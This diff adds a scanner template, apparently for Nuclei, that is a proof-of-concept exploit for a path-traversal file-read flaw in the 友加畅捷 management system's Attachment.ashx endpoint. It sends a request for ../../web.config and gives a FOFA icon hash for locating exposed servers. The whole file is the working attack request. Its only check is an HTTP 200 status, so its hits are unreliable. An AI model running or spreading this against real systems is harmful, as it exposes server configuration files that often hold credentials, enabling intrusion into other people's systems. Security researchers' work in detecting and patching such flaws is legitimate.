@@ -1,0 +1,27 @@
+id: poc-ypu6uxu4iqgvz7wb
+info:
+  name: 友加畅捷管理系统 Attachment.ashx 存在文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ypu6uxu4iqgvz7wb'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ypu6uxu4iqgvz7wb
+    fofa: icon_hash="2049187099"
+http:
+- raw:
+  - 'GET /Controllers/ajax/Attachment.ashx?attachmentUrl=../../web.config HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/598.89'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
